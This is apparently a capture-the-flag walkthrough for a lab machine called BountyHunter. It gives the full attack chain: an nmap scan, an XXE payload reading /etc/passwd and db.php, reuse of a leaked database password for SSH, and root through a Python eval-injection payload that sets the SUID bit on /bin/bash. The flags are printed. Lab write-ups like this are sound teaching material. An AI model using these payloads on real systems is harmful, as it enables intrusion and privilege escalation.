![Explore.PNG](/assets/Machines/Easy/BountyHunter/BountyHunter.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.11.100
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.11.100
```

**Output**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```


3. Visit the web page

![web.PNG](/assets/Machines/Easy/BountyHunter/web.PNG)


4. Go to **Portal** >> Click on **here**

![web2.PNG](/assets/Machines/Easy/BountyHunter/web2.PNG)


5. Analyze the petition with **BurpSuite**

![burp.PNG](/assets/Machines/Easy/BountyHunter/burp.PNG)

6. The data is **encode in base64 and urlencode**, use BurpSuite to decode

* First, urldecode data, select all and press `Ctrl` + `Shift` + `u`
* Go to **Decode** and paste the selection data
  
![decode.PNG](/assets/Machines/Easy/BountyHunter/decode.PNG)

* Look the data tramited is a xml, we can inject entities to read files.


7. Read `/etc/passwd` file

* To do that you need to create a entity like `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`

* Next, encode data int base64

![xxe.PNG](/assets/Machines/Easy/BountyHunter/xxe.PNG)

8. Send data encode and select all and press `Ctrl` + `u`

![passwd.PNG](/assets/Machines/Easy/BountyHunter/passwd.PNG)

* We look the users **development** and **root**

9. Use **wfuzz** to find more files .php
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/BountyHunter]
└─| wfuzz -c -t 20 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bountyhunter.htb/FUZZ.php
```

**Output**
```bash
000000848:   200        0 L      0 W        0 Ch        "db" 
```

* Yep!, sometimes **db files** have credentials

10. Read **db.php** with the entity created, but, this time we use other wrapper to read information.  `php://filter/convert.base64-encode/resource=db.php`

![db.PNG](/assets/Machines/Easy/BountyHunter/db.PNG)

**Output**

![db_out.PNG](/assets/Machines/Easy/BountyHunter/db_out.PNG)


11. Decode this data
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/BountyHunter]
└─| echo "PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=" | base64 -d
```

**Output**
```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

12. With **password:** m19RoAU0hP41A1sTsq6K and **username"** development login with ssh

```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/BountyHunter]
└─| ssh development@10.10.11.100
```

**Output**
```bash
development@bountyhunter:~$ 
```

13. Cat **user flag**
```bash
development@bountyhunter:~$ cat user.txt 
a074825ca361cc83f2f33f49ba876c71
```

14. Search for any permission
```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

* We can run **ticketValidator.py** how root

15. Cat the file
```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```


16. The function **eval** can run commands, try to exploit this.

17. You need to create this file in `/tmp`

```txt
# Skytrain Inc
## Ticket to 
__Ticket Code:__
** 11 + 2 and __import__('os').system('chmod u+s /bin/bash')
```

18. And run the python file
```bash
development@bountyhunter:/tmp$ sudo -u root python3.8 /opt/skytrain_inc/ticketValidator.py
```

**Output**
```bash
development@bountyhunter:/tmp$ sudo -u root python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/ticket.md
Destination: 
Invalid ticket.
```
* After, check permissions of `/bin/bash`
```bash
development@bountyhunter:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```

19. Execute commando to get bash how root
```bash
development@bountyhunter:/tmp$ bash -p
```

**Output**
```bash
bash-5.0# whoami
root
```

20. Finally, cat the **root flag** in path `/root`
```bash
bash-5.0# cat root.txt 
9e90210e3c71235729ec0277234e4ca5
```